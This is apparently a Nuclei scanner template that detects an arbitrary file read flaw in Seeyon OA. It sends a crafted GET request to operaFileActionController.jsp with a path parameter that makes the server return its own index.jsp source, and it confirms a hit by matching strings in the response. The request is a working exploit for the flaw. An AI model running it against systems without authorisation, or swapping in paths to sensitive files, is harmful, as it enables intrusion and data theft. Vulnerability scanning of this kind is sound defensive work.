id: seeyon-oa-operafileactioncontroller-fileread

info:
  name: 致远OA operaFileActionController.jsp 任意文件读取
  author: SleepingBag945
  severity: high

http:
  - raw:
      - |
        GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains_all(body, 'WebTransportUtil','UserFileType')"
